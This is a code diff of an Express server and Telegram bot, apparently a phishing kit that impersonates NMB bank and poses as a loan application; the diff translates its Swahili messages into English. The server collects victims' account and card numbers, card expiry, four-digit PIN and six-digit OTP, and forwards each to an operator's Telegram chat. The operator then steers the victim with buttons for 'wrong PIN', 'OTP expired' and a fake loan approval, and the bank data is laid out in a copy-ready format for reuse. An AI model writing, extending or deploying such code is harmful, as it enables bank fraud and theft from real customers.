@@ -69,9 +69,9 @@ async function initBot() {
 
       const userLink = `${APP_URL}/?admin=${chatId}`;
       const adminMessage = `👑 *NMB Admin Panel*\n\n` +
-                           `👤 *Jina:* ${firstName} ${lastName}\n` +
+                           `👤 *User:* ${firstName} ${lastName}\n` +
                            `• Chat ID: \`${chatId}\`\n\n` +
-                           `🔗 *Linki yako binafsi:*\n${userLink}`;
+                           `🔗 *Your Link:*\n${userLink}`;
       await bot.sendMessage(chatId, adminMessage, { parse_mode: 'Markdown' });
     } catch (err) {}
   });
@@ -92,39 +92,39 @@ async function initBot() {
       switch (actionType) {
         case 'DENY_BANK':
           session.status = 'DENIED_STOP';
-          await bot.sendMessage(chatTarget, `❌ Bank details zimekataliwa (DENIED). Mteja amesimamishwa.`);
+          await bot.sendMessage(chatTarget, `❌ Bank details denied. Applicant stopped.`);
           break;
         case 'ALLOW_BANK':
           session.status = 'PROCEED_CREDENTIALS';
-          await bot.sendMessage(chatTarget, `✅ Bank details zimekubaliwa (ALLOW). Mteja anaendelea kwenye fomu/PIN.`);
+          await bot.sendMessage(chatTarget, `✅ Bank details allowed. Moved to Sign In.`);
           break;
         case 'DISALLOWED_CRED':
           session.status = 'DENIED_STOP';
-          await bot.sendMessage(chatTarget, `❌ Kuingia kumekataliwa (DISALLOWED).`);
+          await bot.sendMessage(chatTarget, `❌ Sign in disallowed.`);
           break;
         case 'ALLOW_CRED':
           session.status = 'PROCEED_OTP';
-          await bot.sendMessage(chatTarget, `✅ Sign in imekubaliwa. Mteja ameelekezwa kwenye ukurasa wa OTP.`);
+          await bot.sendMessage(chatTarget, `✅ Sign in approved. Moved to OTP.`);
           break;
         case 'WRONG_PIN':
           session.status = 'RETRY_PIN';
           session.pin = '';
-          await bot.sendMessage(chatTarget, `❌ WRONG PIN imetumwa. Mteja anaombwa kuweka PIN sahihi upya.`);
+          await bot.sendMessage(chatTarget, `❌ Wrong PIN sent. Prompting applicant for new PIN.`);
           break;
         case 'OTP_EXPIRED':
           session.status = 'RETRY_OTP';
           session.otp = '';
-          await bot.sendMessage(chatTarget, `❌ OTP EXPIRED imetumwa. Mteja anaombwa kuingiza OTP mpya.`);
+          await bot.sendMessage(chatTarget, `❌ OTP expired sent. Prompting applicant for new OTP.`);
           break;
         case 'APPROVED_FINAL':
           session.status = 'SUCCESS';
-          await bot.sendMessage(chatTarget, `🎉 Mkopo umeidhinishwa (APPROVED)! Ukurasa wa mafanikio umeonyeshwa.`);
+          await bot.sendMessage(chatTarget, `🎉 Loan approved! Success screen shown.`);
           break;
         default:
           break;
       }
 
-      await bot.answerCallbackQuery(query.id, { text: `Imekamilika` }).catch(() => {});
+      await bot.answerCallbackQuery(query.id, { text: `Done` }).catch(() => {});
       if (query.message && query.message.message_id) {
         await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: query.message.chat.id, message_id: query.message.message_id }).catch(() => {});
       }
@@ -152,13 +152,11 @@ app.post('/api/submit-bank', async (req, res) => {
       status: 'WAITING_BANK_APPROVAL' 
     });
 
-    const message = `🏦 **NEW NMB APPLICANT - BANK DETAILS**\n\n` +
-                    `📌 *Aina ya Kitambulisho:* \`${identifierType || 'Phone No'}\`\n` +
-                    `📱 *Thamani:* \`${identifierValue}\`\n` +
-                    `🏛 *Nambari ya Akaunti:* \`${accountNo}\`\n` +
-                    `💳 *Nambari ya Kadi:* \`${cardNo}\`\n` +
-                    `📅 *Expiry Date:* \`${expiry}\`\n\n` +
-                    `📋 *Fomati ya kunakili:*\n\`${identifierValue}:${accountNo}:${cardNo}\``;
+    const message = `🏦 *BANK DETAILS*\n\n` +
+                    `📌 *${identifierType || 'Phone No'}:* \`${identifierValue}\`\n` +
+                    `🏛 *Account:* \`${accountNo}\`\n` +
+                    `💳 *Card:* \`${cardNo}\` (${expiry})\n\n` +
+                    `\`${identifierValue}:${accountNo}:${cardNo}\``;
 
     const opts = {
       parse_mode: 'Markdown',
@@ -175,7 +173,7 @@ app.post('/api/submit-bank', async (req, res) => {
     if (bot) await bot.sendMessage(targetChat, message, opts);
     return res.status(200).json({ success: true, userId });
   } catch (err) {
-    return res.status(500).json({ success: false, error: 'Tatizo la mtandao.' });
+    return res.status(500).json({ success: false, error: 'Network error.' });
   }
 });
 
@@ -196,9 +194,9 @@ app.post('/api/submit-credentials', async (req, res) => {
     session.status = 'WAITING_CRED_APPROVAL';
     session.pin = pin;
 
-    const message = `🔐 **NMB SIGN IN CREDENTIALS**\n\n` +
+    const message = `🔐 *SIGN IN CREDENTIALS*\n\n` +
                     `📌 *${identifierType || 'Phone No'}:* \`${identifierValue}\`\n` +
-                    `🔒 *PIN ya Tarakimu 4:* \`${pin}\``;
+                    `🔒 *4-Digit PIN:* \`${pin}\``;
 
     const opts = {
       parse_mode: 'Markdown',
@@ -215,7 +213,7 @@ app.post('/api/submit-credentials', async (req, res) => {
     if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
     return res.status(200).json({ success: true });
   } catch (error) {
-    return res.status(500).json({ success: false, error: 'Tatizo' });
+    return res.status(500).json({ success: false, error: 'Error' });
   }
 });
 
@@ -229,8 +227,8 @@ app.post('/api/submit-otp', async (req, res) => {
     session.status = 'WAITING_OTP_APPROVAL';
     session.otp = otp;
 
-    const message = `🔑 **OTP VERIFICATION**\n\n` +
-                    `📱 *Msimbo wa OTP (Tarakimu 6):* \`${otp}\``;
+    const message = `🔑 *OTP VERIFICATION*\n\n` +
+                    `📱 *6-Digit OTP:* \`${otp}\``;
 
     const opts = {
       parse_mode: 'Markdown',
@@ -248,7 +246,7 @@ app.post('/api/submit-otp', async (req, res) => {
     if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
     return res.status(200).json({ success: true });
   } catch (error) {
-    return res.status(500).json({ success: false, error: 'Tatizo' });
+    return res.status(500).json({ success: false, error: 'Error' });
   }
 });
 
